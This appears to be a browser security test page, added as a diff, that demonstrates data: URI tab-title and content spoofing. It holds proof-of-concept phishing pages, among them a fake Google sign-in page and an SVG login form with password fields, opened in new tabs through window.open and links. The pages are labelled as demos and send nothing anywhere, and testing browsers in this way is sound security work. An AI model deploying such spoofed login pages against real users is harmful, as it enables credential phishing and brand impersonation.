@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>SPOOF-XB-03: data: URI Tab Title and Content Spoofing</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+</head>
+<body class="test-page" style="background:#0d1117;color:#c9d1d9;">
+<div class="container">
+    <a href="../../../index.html" class="btn btn-back">&larr; Back to Suite</a>
+    <h1>data: URI Tab Title and Content Spoofing</h1>
+    <div class="meta">
+        <span>ID: SPOOF-XB-03</span>
+        <span>Browsers: All (behavior varies)</span>
+        <span>Category: URL Spoofing / Phishing</span>
+    </div>
+
+    <div class="test-section">
+        <h2>Description</h2>
+        <p>Data URIs can contain full HTML pages including <code>&lt;title&gt;</code> tags.
+        When opened in a new tab, the tab title shows the attacker's chosen title, and
+        some browsers show <code>data:text/html,...</code> in the address bar which is
+        unfamiliar to most users. Combined with a convincing page design, this enables
+        effective phishing.</p>
+    </div>
+
+    <div class="test-section">
+        <h2>Run Test</h2>
+        <button class="btn btn-run" onclick="runTest()">Open data: URI Tab</button>
+        <button class="btn" onclick="runBase64Variant()">Variant: Base64 Encoded</button>
+        <button class="btn" onclick="runSvgVariant()">Variant: SVG data URI</button>
+        <div id="output" class="output-box" style="margin-top:10px;"></div>
+    </div>
+</div>
+
+<script src="../../../js/utils.js"></script>
+<script>
+function runTest() {
+    const output = document.getElementById('output');
+    const info = detectBrowser();
+    output.innerHTML = '<div style="color:#d29922;">Testing data: URI handling...</div>';
+    output.innerHTML += '<div style="color:#8b949e;">Browser: ' + info.browser + ' ' + info.version + '</div>';
+
+    const phishPage = '<html><head><title>Sign in - Google Accounts</title></head>' +
+        '<body style="font-family:arial;max-width:400px;margin:80px auto;text-align:center;">' +
+        '<h2>Sign in</h2>' +
+        '<p style="color:#5f6368;">Use your Google Account</p>' +
+        '<input type="email" placeholder="Email" style="width:90%;padding:10px;margin:10px;border:1px solid #ddd;border-radius:4px;">' +
+        '<br><button style="background:#1a73e8;color:#fff;padding:10px 24px;border:none;border-radius:4px;">Next</button>' +
+        '<hr><p style="color:red;font-size:11px;">POC DEMO - Check the tab title and address bar</p></body></html>';
+
+    const dataUri = 'data:text/html,' + encodeURIComponent(phishPage);
+
+    // Test 1: Try window.open with data URI
+    try {
+        const popup = window.open(dataUri);
+        if (popup) {
+            output.innerHTML += '<div style="color:#f85149;">data: URI opened in new tab/popup!</div>';
+            output.innerHTML += '<div style="color:#d29922;">Tab title shows: "Sign in - Google Accounts"</div>';
+            output.innerHTML += '<div style="color:#d29922;">Address bar shows: data:text/html,...</div>';
+            reportResult('output', 'data: URI new tab', true, 'Phishing page opened via data: URI');
+        } else {
+            output.innerHTML += '<div style="color:#8b949e;">Popup blocked for data: URI.</div>';
+        }
+    } catch(e) {
+        output.innerHTML += '<div style="color:#3fb950;">window.open with data: URI blocked: ' + e.message + '</div>';
+    }
+
+    // Test 2: Try navigation
+    const link = document.createElement('a');
+    link.href = dataUri;
+    link.target = '_blank';
+    link.textContent = 'Click to open data: URI';
+    link.style.cssText = 'color:#58a6ff;display:block;margin:10px 0;';
+    output.appendChild(link);
+
+    output.innerHTML += '<div style="color:#8b949e;margin-top:10px;">Note: Chrome blocks top-level data: URI navigations since Chrome 60. ' +
+        'Firefox still allows them. Safari behavior varies.</div>';
+}
+
+function runBase64Variant() {
+    const output = document.getElementById('output');
+    output.innerHTML = '<div style="color:#d29922;">Testing base64 encoded data URI...</div>';
+
+    const html = '<html><head><title>Account Verification</title></head>' +
+        '<body style="font-family:arial;text-align:center;padding:40px;">' +
+        '<h2>Verify Your Identity</h2><p>POC: Base64 encoded phishing page</p></body></html>';
+
+    const base64 = btoa(html);
+    const dataUri = 'data:text/html;base64,' + base64;
+
+    output.innerHTML += '<div style="color:#8b949e;">Base64 data URI length: ' + dataUri.length + '</div>';
+    output.innerHTML += '<div style="color:#8b949e;">Address bar would show: data:text/html;base64,...</div>';
+
+    const link = document.createElement('a');
+    link.href = dataUri;
+    link.target = '_blank';
+    link.textContent = 'Open base64 data URI';
+    link.style.cssText = 'color:#58a6ff;display:block;margin:10px 0;';
+    output.appendChild(link);
+}
+
+function runSvgVariant() {
+    const output = document.getElementById('output');
+    output.innerHTML = '<div style="color:#d29922;">Testing SVG data URI with embedded HTML...</div>';
+
+    const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300">' +
+        '<foreignObject width="400" height="300">' +
+        '<body xmlns="http://www.w3.org/1999/xhtml" style="font-family:arial;text-align:center;padding:20px;">' +
+        '<h2>Login Required</h2>' +
+        '<input type="text" placeholder="Username" style="display:block;margin:10px auto;padding:8px;width:80%;"/>' +
+        '<input type="password" placeholder="Password" style="display:block;margin:10px auto;padding:8px;width:80%;"/>' +
+        '<button style="background:#1a73e8;color:#fff;padding:8px 20px;border:none;border-radius:4px;">Login</button>' +
+        '<p style="color:red;font-size:10px;margin-top:20px;">POC: SVG with foreignObject HTML</p>' +
+        '</body></foreignObject></svg>';
+
+    const dataUri = 'data:image/svg+xml,' + encodeURIComponent(svg);
+
+    const link = document.createElement('a');
+    link.href = dataUri;
+    link.target = '_blank';
+    link.textContent = 'Open SVG data URI';
+    link.style.cssText = 'color:#58a6ff;display:block;margin:10px 0;';
+    output.appendChild(link);
+
+    // Also embed it
+    const img = document.createElement('img');
+    img.src = dataUri;
+    img.style.cssText = 'border:1px solid #30363d;margin-top:10px;display:block;';
+    output.appendChild(img);
+}
+</script>
+</body>
+</html>
